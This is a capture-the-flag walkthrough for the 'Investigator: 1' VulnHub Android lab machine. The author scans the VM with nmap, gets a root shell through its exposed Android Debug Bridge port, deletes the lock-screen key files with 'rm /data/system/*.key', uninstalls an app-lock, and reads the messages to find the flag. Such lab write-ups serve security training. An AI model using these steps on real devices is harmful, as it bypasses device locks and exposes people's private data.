# Investigator: 1

![image](https://user-images.githubusercontent.com/44063862/88505808-0d06f980-d00b-11ea-8bbe-8361f6769660.png)

## Link

[Investigator: 1](https://www.vulnhub.com/entry/investigator-1,504/#)

## Penetration Testing Methodology

**Reconnaissance**
* netdiscover
* nmap

**Enumeration**
* adb

**Exploitation**
* 

**Privilege Escalation**
* 

**Capturing the flag**
* root.txt
_______________________________________________________________________________________________________

## Walkthrough

```
netdiscover
```

> Make sure [Investigator: 1](https://www.vulnhub.com/entry/investigator-1,504/#) machine connection is set to NAT.

```
nmap -A 10.10.24.60
```

```
root@kali:~# nmap -A 192.168.235.155
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-14 02:18 EDT
Nmap scan report for 192.168.235.155
Host is up (0.00078s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
5555/tcp open  adb     Android Debug Bridge device (name: android_x86; model: VMware Virtual Platform; device: x86)
8080/tcp open  http    PHP cli server 5.5 or later
|_http-title: Welcome To  UnderGround Sector
MAC Address: 00:0C:29:93:9F:80 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Android; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.78 ms 192.168.235.155

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.80 seconds
root@kali:~# 
```

From the nmap scanning. I found that 2 port open. Which is
* 5555 (adb) 
* 8080 (http)

I then browse to the http://ip:8080

![port 80](https://user-images.githubusercontent.com/44063862/88506490-9bc84600-d00c-11ea-8fea-582ff9f6d698.png)

Hint:
• Agent ‘s’
• 6666666666

But, we do not know what this hint for. So, just note it, we will get to it later.

I got stucked here... :(

Then, I try to look more on port 55555 which is adb. Actually I never heard of it before. 

[ADB (Android Debug Bridge)](https://developer.android.com/studio/command-line/adb)

Step:

```
adb connect ip
```

> Connect to the device by its IP address.

```
adb devices
```

> Confirm that our host computer is connected to the target device

![image](https://user-images.githubusercontent.com/44063862/88507549-3f1a5a80-d00f-11ea-8d25-89cf4c6baa5e.png)

```
adb shell
```

* su (we will get root right away (easy root)
* ls
* cd /data/root
* ls (ooooo, I see our flag. :) heheheheh)

![image](https://user-images.githubusercontent.com/44063862/88507823-de3f5200-d00f-11ea-8bdb-029fd4424e87.png)

```
cat flag.txt
```

![image](https://user-images.githubusercontent.com/44063862/88508138-a258bc80-d010-11ea-9778-5d192ef56be7.png)

> "Your flag is not here"

WAIT!! What???!

![image](https://user-images.githubusercontent.com/44063862/88508311-0ed3bb80-d011-11ea-83c2-7683ec4aeaa7.png)

Okay.... we must start serious now. 

![image](https://user-images.githubusercontent.com/44063862/88508374-3cb90000-d011-11ea-90ce-bce608816752.png)

**Google Fu time**

Erm.. dead end again.. hmm.. should we do anything to the machine? Wait aaa, i see what can we do.. Do we need to crack the lock? Can we cracked it?

![image](https://user-images.githubusercontent.com/44063862/88508673-fd3ee380-d011-11ea-9781-1f05a0f1d839.png)

We no need to waste our time crack it. We can just simply remove the key as we are root shell now. (I'm sorry, i dont find the resource that I read to remove the key)

```
rm /data/system/*.key
```

![image](https://user-images.githubusercontent.com/44063862/88508858-5d358a00-d012-11ea-9d80-ff23f98538a4.png)

Remove the applock

```
adb uninstall com.martianmode.aaplock
```

![image](https://user-images.githubusercontent.com/44063862/88509192-214ef480-d013-11ea-91b9-fc7941140771.png)

Okay, now we try to open the apps.

As you can see, we successfully in. :).. I try to find like, image or notes.. But nah, found nothing. Lastly, i think about message.

Wow, thats a lot of message here.

![image](https://user-images.githubusercontent.com/44063862/88509464-be119200-d013-11ea-81bc-8ffb48501f67.png)

Hmm, not in here..

![image](https://user-images.githubusercontent.com/44063862/88509512-cd90db00-d013-11ea-8851-b87e69dcefd5.png)

Just then I remember about the hint that Agent 'S' left us. The 6666666666. Is it the phone number?

![image](https://user-images.githubusercontent.com/44063862/88509728-4a23b980-d014-11ea-8add-1d89c4869563.png)

Yeayyyy, thats it. Thank you for reading :)


**By _AdaniKamal_**
